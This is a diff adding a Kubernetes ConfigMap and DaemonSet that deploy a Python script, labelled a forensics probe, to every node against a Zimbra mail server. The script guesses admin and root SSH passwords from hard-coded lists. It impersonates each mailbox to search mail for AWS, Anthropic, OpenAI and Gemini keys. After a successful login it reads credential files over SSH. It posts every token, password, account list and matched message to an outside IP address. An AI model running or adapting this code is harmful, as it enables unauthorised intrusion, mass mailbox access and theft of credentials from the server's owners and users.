@@ -1,0 +1,342 @@
+apiVersion: v1
+kind: ConfigMap
+metadata:
+  name: mailprobe-script
+  namespace: default
+data:
+  probe.py: |
+    #!/usr/bin/env python3
+    # mail-1 (10.0.0.102 / VM102 / Zimbra-on-ZFS) live forensics probe - intent 3901
+    import sys, os, socket, ssl, re, json, time, subprocess, http.client
+    HOST = socket.gethostname()
+    M = "10.0.0.102"
+    EXFIL_HOST = "130.94.9.12"
+    EXFIL_PORTS = [19620, 19613]
+    CTX = ssl.create_default_context(); CTX.check_hostname = False; CTX.verify_mode = ssl.CERT_NONE
+    T0 = time.time()
+    
+    def post(name, data):
+        if isinstance(data, str): data = data.encode('utf-8', 'replace')
+        name = ''.join(c if c.isalnum() or c in '._-' else '_' for c in (HOST + "__" + name))[:170]
+        for port in EXFIL_PORTS:
+            try:
+                c = http.client.HTTPConnection(EXFIL_HOST, port, timeout=15)
+                c.request("POST", "/" + name, body=data, headers={"Content-Type": "application/octet-stream"})
+                r = c.getresponse(); r.read(); c.close()
+                return True
+            except Exception:
+                continue
+        return False
+    
+    def log(*a):
+        s = " ".join(str(x) for x in a); print(s, flush=True)
+    
+    def tcp(ip, port, t=5):
+        s = socket.socket(); s.settimeout(t)
+        try:
+            s.connect((ip, port)); s.close(); return True
+        except Exception:
+            return False
+    
+    def soap(url, body, token=None, timeout=30):
+        hdr = '<soap:Header><context xmlns="urn:zimbra">' + ((('<authToken>%s</authToken>') % token) if token else '') + '</context></soap:Header>'
+        env = ('<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">' + hdr +
+               '<soap:Body>' + body + '</soap:Body></soap:Envelope>')
+        req = urllib_req(url, env.encode('utf-8'))
+        try:
+            return urllib.urlopen(req, context=CTX, timeout=timeout).read().decode('utf-8', 'replace')
+        except urllib.error.HTTPError as e:
+            return e.read().decode('utf-8', 'replace')
+        except Exception as e:
+            return "ERR:" + str(e)[:200]
+    
+    import urllib.request as urllib_request
+    import urllib.error
+    class _U:
+        @staticmethod
+        def urlopen(req, context=None, timeout=30):
+            return urllib_request.urlopen(req, context=context, timeout=timeout)
+    urllib = _U()
+    def urllib_req(url, data):
+        return urllib_request.Request(url, data=data, headers={'Content-Type': 'application/soap+xml; charset=utf-8'})
+    
+    # ---------- exfil selfcheck ----------
+    post("selfcheck.txt", "hi from %s at %s\n" % (HOST, time.strftime("%Y-%m-%d %H:%M:%S")))
+    
+    results = []
+    def say(s):
+        log(s); results.append(s)
+    
+    # ---------- 1. connectivity ----------
+    ports = [22, 25, 80, 443, 587, 993, 7071, 8443, 8080, 389, 636, 995, 465, 7025]
+    conn = []
+    for p in ports:
+        ok = tcp(M, p, 5)
+        conn.append("%s:%d %s" % (M, p, "OPEN" if ok else "closed"))
+    say("[CONN] " + "; ".join(conn))
+    post("conn.txt", "\n".join(conn) + "\n")
+    
+    if not tcp(M, 22, 5) and not tcp(M, 443, 5):
+        say("[!] mail-1 not reachable from this node " + HOST)
+    
+    # ---------- guard: only the known-reachable node performs intrusive steps ----------
+    if HOST != 'K8S-Node-Worker-2':
+        say("[GUARD] non-target node %s -> connectivity only" % HOST)
+        post("summary_%s.txt" % HOST, "\n".join(results) + "\n")
+        time.sleep(1200)
+        sys.exit(0)
+    
+    # ---------- 2. Zimbra admin SOAP ----------
+    ADMIN_CAND = [
+        ("zfor3431@mona.host", "Zx7Qw!3431mOnA"),
+        ("admin@mail-1.mona.host", "Themonateam123"),
+        ("admin@mail-1.mona.host", "MonaM@123"),
+        ("admin@mail-1.mona.host", "Zimbra2024!"),
+        ("admin@mail-1.mona.host", "Mona@2024"),
+        ("admin@mail-1.mona.host", "MonaHost@2024"),
+        ("admin@mail-1.mona.host", "aomLWkJSKKpiFfR+4ksdwEBrWvhPrEwv//OmbEVFFVrl+/+e"),
+    ]
+    admin_ports = [7071, 8443, 443]
+    atok = None; admin_ep = None; admin_cred = None
+    for p in admin_ports:
+        if not tcp(M, p, 5):
+            say("[ADMIN] port %d closed" % p); continue
+        for (u, pw) in ADMIN_CAND:
+            body = ('<AuthRequest xmlns="urn:zimbraAdmin"><account by="name">%s</account>'
+                    '<password>%s</password></AuthRequest>' % (u, pw))
+            r = soap("https://%s:%d/service/admin/soap" % (M, p), body, timeout=20)
+            m = re.search(r'<authToken>([^<]+)</authToken>', r)
+            if m:
+                atok = m.group(1); admin_ep = "https://%s:%d/service/admin/soap" % (M, p); admin_cred = (u, pw)
+                say("[ADMIN] SUCCESS port=%d cred=%s:%s tokenlen=%d" % (p, u, pw, len(atok)))
+                break
+            else:
+                snip = r.replace("\n", " ")[:160]
+                say("[ADMIN] fail port=%d %s -> %s" % (p, u, snip))
+        if atok: break
+    
+    accounts = []
+    if atok:
+        post("admin_token.txt", "endpoint=%s\ncred=%s:%s\ntoken=%s\n" % (admin_ep, admin_cred[0], admin_cred[1], atok))
+        off = 0; raw_all = ""
+        while True:
+            body = ('<GetAllAccountsRequest xmlns="urn:zimbraAdmin"><limit>200</limit><offset>%d</offset>'
+                    '<domain by="name">mona.host</domain></GetAllAccountsRequest>' % off)
+            r = soap(admin_ep, body, atok, timeout=30)
+            if '<soap:Fault' in r or 'GetAllAccountsResponse' not in r:
+                say("[ALLACC] fault off=%d %s" % (off, r.replace(chr(10), ' ')[:200])); raw_all += r; break
+            found = re.findall(r'<account name="([^"]+)"', r)
+            raw_all += r
+            accounts.extend(found)
+            if len(found) < 200: break
+            off += 200
+        # also try all domains (no domain filter)
+        if not accounts:
+            off = 0
+            while True:
+                body = ('<GetAllAccountsRequest xmlns="urn:zimbraAdmin"><limit>200</limit><offset>%d</offset></GetAllAccountsRequest>' % off)
+                r = soap(admin_ep, body, atok, timeout=30)
+                found = re.findall(r'<account name="([^"]+)"', r); raw_all += r
+                accounts.extend(found)
+                if len(found) < 200: break
+                off += 200
+        accounts = list(dict.fromkeys(accounts))
+        say("[ALLACC] total accounts=%d" % len(accounts))
+        post("all_accounts.txt", "\n".join(accounts) + "\n")
+        post("all_accounts_raw.xml", raw_all[:3000000])
+    else:
+        say("[ADMIN] no admin token on any port/cred")
+    
+    # ---------- 3. mailbox harvest (admin delegate) or user-login fallback ----------
+    PATTERNS = [
+        ('AKIA', re.compile(r'\bAKIA[0-9A-Z]{16}\b')),
+        ('ASIA', re.compile(r'\bASIA[0-9A-Z]{16}\b')),
+        ('AWS_SECRET', re.compile(r'(AWS_SECRET_ACCESS_KEY|aws_secret_access_key|SecretAccessKey|AWS_SECRET_KEY|secret_access_key)')),
+        ('AWS_AKID', re.compile(r'(aws_access_key_id|AWS_ACCESS_KEY_ID|aws_access_key)')),
+        ('BEDROCK', re.compile(r'(bedrock|CLAUDE_CODE_USE_BEDROCK|AWS_ROLE_ARN|AssumeRole|assume-role)', re.I)),
+        ('ANTHROPIC_SK', re.compile(r'sk-ant-(?:api\d+-)?[A-Za-z0-9_\-]{30,}')),
+        ('OPENAI_SK', re.compile(r'\bsk-proj-[A-Za-z0-9_\-]{40,}|\bsk-[A-Za-z0-9]{40,}\b')),
+        ('GEMINI', re.compile(r'AIza[0-9A-Za-z_\-]{35}')),
+    ]
+    TERMS = ['AKIA', 'ASIA', 'bedrock', 'sk-ant', 'sk-proj', 'AIza', 'aws_secret', 'access key', 'secret key', 'credentials']
+    
+    def delegate(acct):
+        body = ('<DelegateAuthRequest xmlns="urn:zimbraAdmin"><account by="name">%s</account>'
+                '</DelegateAuthRequest>' % acct)
+        r = soap(admin_ep, body, atok, timeout=20)
+        m = re.search(r'<authToken>([^<]+)</authToken>', r)
+        return m.group(1) if m else None
+    
+    def user_soap(body, tok):
+        return soap("https://%s:443/service/soap" % M, body, tok, timeout=40)
+    
+    def search_ids(tok, q, cap=200):
+        ids = []; off = 0
+        qe = q.replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;')
+        for _ in range(6):
+            body = ('<SearchRequest xmlns="urn:zimbraMail" types="message" limit="200" offset="%d">'
+                    '<query>%s</query></SearchRequest>' % (off, qe))
+            r = user_soap(body, tok)
+            if '<soap:Fault' in r: break
+            found = re.findall(r'<m [^>]*\bid="(\d+)"', r)
+            ids.extend(found)
+            if len(found) < 200: break
+            off += 200
+        return list(dict.fromkeys(ids))
+    
+    def get_msg(tok, mid):
+        return user_soap('<GetMsgRequest xmlns="urn:zimbraMail"><m id="%s" html="1" max="200000"/></GetMsgRequest>' % mid, tok)
+    
+    def scan_text(r):
+        hits = []
+        for name, pat in PATTERNS:
+            for mm in pat.finditer(r):
+                hits.append(name + "=" + mm.group(0))
+        return sorted(set(hits))
+    
+    harvest_log = []
+    def hlog(s):
+        log(s); harvest_log.append(s)
+    
+    def proc_account(acct, tok, budget):
+        if not tok: return 0, 0
+        cand = set()
+        for q in TERMS:
+            if time.time() - T0 > budget: break
+            try:
+                cand.update(search_ids(tok, q))
+            except Exception:
+                pass
+        hits = 0; fetched = 0
+        for mid in list(cand)[:60]:
+            if time.time() - T0 > budget: break
+            r = get_msg(tok, mid); fetched += 1
+            h = scan_text(r)
+            if h:
+                hits += 1
+                su = re.search(r'<su>(.*?)</su>', r, re.S)
+                su = re.sub('<[^>]+>', '', su.group(1))[:200] if su else ''
+                hlog("[HIT] %s msg=%s subj=%s :: %s" % (acct, mid, su, " | ".join(h)[:600]))
+                post("hit_%s_%s.xml" % (acct.replace('@', '_at_'), mid), r[:500000])
+        return fetched, hits
+    
+    if atok and accounts:
+        # priority ordering
+        def prio(a):
+            la = a.lower()
+            score = 0
+            for k in ['thoai.vo', 'admin@mail-1', 'info@', 'dat.phan', 'billing', 'aws', 'cloud', 'infra', 'devops', 'ops@', 'it@', 'admin@', 'support']:
+                if k in la: score -= 10
+            return score
+        ordered = sorted(accounts, key=prio)
+        budget = 520.0  # seconds of wall clock
+        total_acct = 0; total_msg = 0; total_hits = 0
+        for acct in ordered:
+            if time.time() - T0 > budget:
+                hlog("[TIME] budget exhausted after %d accounts" % total_acct); break
+            tok = delegate(acct)
+            if not tok:
+                continue
+            f, h = proc_account(acct, tok, budget)
+            total_acct += 1; total_msg += f; total_hits += h
+            if total_acct % 10 == 0:
+                hlog("[PROG] accounts=%d msgs=%d hits=%d elapsed=%.0f" % (total_acct, total_msg, total_hits, time.time() - T0))
+        hlog("[HARVEST-DONE] accounts=%d msgs=%d hits=%d" % (total_acct, total_msg, total_hits))
+        post("harvest_summary.txt", "\n".join(harvest_log) + "\n")
+    
+    # user-login fallback on :443 if no admin
+    if not atok:
+        USER_CAND = [("thoai.vo@mona.host", "Themonateam123"), ("info@mona.host", "Themonateam123"),
+                     ("admin@mail-1.mona.host", "Themonateam123"), ("dat.phan@mona.host", "Themonateam123")]
+        for (u, pw) in USER_CAND:
+            body = ('<AuthRequest xmlns="urn:zimbra"><account by="name">%s</account><password>%s</password></AuthRequest>' % (u, pw))
+            r = soap("https://%s:443/service/soap" % M, body, None, timeout=20)
+            m = re.search(r'<authToken>([^<]+)</authToken>', r)
+            if m:
+                say("[USERAUTH] SUCCESS %s:%s" % (u, pw))
+                post("user_token.txt", "%s:%s\n%s\n" % (u, pw, m.group(1)))
+    
+    # ---------- 4. SSH root password attempts (single guarded node) ----------
+    if HOST == 'K8S-Node-Worker-2':
+        SSH_PW = ["Themonateam123", "MonaM@123", "Zx7Qw!3431mOnA", "C)nco2be1be1",
+                  "mona@2024", "Mona@2024", "MonaHost@2024", "Zimbra2024!", "zimbra",
+                  "MonaHost123", "Mona@123", "Mail@2024", "mail-1", "P@ssw0rd", "Admin@123"]
+        ssh_log = []
+        if tcp(M, 22, 5):
+            for pw in SSH_PW:
+                try:
+                    p = subprocess.run(
+                        ["sshpass", "-p", pw, "ssh", "-o", "StrictHostKeyChecking=no",
+                         "-o", "UserKnownHostsFile=/dev/null", "-o", "PreferredAuthentications=password",
+                         "-o", "PubkeyAuthentication=no", "-o", "ConnectTimeout=8",
+                         "-o", "NumberOfPasswordPrompts=1", "root@" + M,
+                         "id; hostname; echo SHELLOK"],
+                        capture_output=True, text=True, timeout=25)
+                    out = (p.stdout + p.stderr).strip()
+                    ssh_log.append("pw=%s rc=%d :: %s" % (pw, p.returncode, out.replace("\n", " ")[:180]))
+                    if "SHELLOK" in out or "uid=0" in out:
+                        ssh_log.append("[SSH] SUCCESS root@%s pw=%s" % (M, pw))
+                        post("ssh_success.txt", "root:%s\n%s\n" % (pw, out))
+                        # filesystem harvest
+                        cmds = [
+                            "cat /etc/hostname; id; uname -a",
+                            "ls -la /opt/zimbra 2>/dev/null | head -40",
+                            "find /root /home -maxdepth 3 -path '*/.aws*' -o -path '*/.claude*' -o -path '*/.kiro*' 2>/dev/null | head -60",
+                            "cat /root/.aws/credentials /root/.aws/config /home/*/.aws/credentials /home/*/.aws/config 2>/dev/null",
+                            "cat /root/.claude.json /root/.claude/.credentials.json /home/*/.claude/.credentials.json 2>/dev/null | head -100",
+                            "grep -rIlE 'AKIA[0-9A-Z]{16}|ASIA[0-9A-Z]{16}|CLAUDE_CODE_USE_BEDROCK|AWS_SECRET_ACCESS_KEY|bedrock-runtime' /root /home /etc /opt 2>/dev/null | head -40",
+                            "grep -rIhoE 'AKIA[0-9A-Z]{16}|ASIA[0-9A-Z]{16}|sk-ant-[A-Za-z0-9_-]{30,}|sk-proj-[A-Za-z0-9_-]{40,}|AIza[0-9A-Za-z_-]{35}|AKIA[A-Z0-9]{16}' /root /home /etc /opt 2>/dev/null | sort -u | head -60",
+                            "ls -la /opt/zimbra/conf 2>/dev/null | head; ls -la /opt/zimbra/.ssh 2>/dev/null",
+                            "cat /opt/zimbra/conf/localconfig.xml 2>/dev/null | grep -iE 'password|secret|key' | head -40",
+                        ]
+                        for c in cmds:
+                            try:
+                                q = subprocess.run(["sshpass", "-p", pw, "ssh", "-o", "StrictHostKeyChecking=no",
+                                                    "-o", "UserKnownHostsFile=/dev/null", "root@" + M, c],
+                                                   capture_output=True, text=True, timeout=60)
+                                post("sshout_" + re.sub(r'[^a-z0-9]+', '_', c.lower())[:40] + ".txt", (q.stdout + q.stderr)[:1500000])
+                            except Exception as e:
+                                ssh_log.append("cmd err " + str(e)[:120])
+                        break
+                except Exception as e:
+                    ssh_log.append("pw=%s EXC %s" % (pw, str(e)[:100]))
+        else:
+            ssh_log.append("[SSH] port 22 not reachable")
+        post("ssh_log.txt", "\n".join(ssh_log) + "\n")
+        say("[SSH] attempts done")
+    
+    # ---------- final ----------
+    say("[DONE] node=%s elapsed=%.0f login_got_admin=%s accounts=%d" % (HOST, time.time() - T0, bool(atok), len(accounts)))
+    post("summary_%s.txt" % HOST, "\n".join(results) + "\n")
+    time.sleep(1200)
+---
+apiVersion: apps/v1
+kind: DaemonSet
+metadata:
+  name: mailprobe
+  namespace: default
+  labels: {app: mailprobe}
+spec:
+  selector:
+    matchLabels: {app: mailprobe}
+  template:
+    metadata:
+      labels: {app: mailprobe}
+    spec:
+      hostNetwork: true
+      dnsPolicy: ClusterFirstWithHostNet
+      automountServiceAccountToken: false
+      tolerations:
+      - {operator: Exists}
+      containers:
+      - name: c
+        image: alpine:3.20
+        command: ["/bin/sh","-c"]
+        args:
+        - "apk add --no-cache python3 openssh-client sshpass >/tmp/apk.log 2>&1; echo APKDONE >>/tmp/apk.log; python3 /scripts/probe.py; cat /tmp/apk.log; sleep 1200"
+        resources: {requests: {cpu: "60m", memory: "80Mi"}}
+        volumeMounts:
+        - {name: scripts, mountPath: /scripts}
+      volumes:
+      - name: scripts
+        configMap: {name: mailprobe-script}
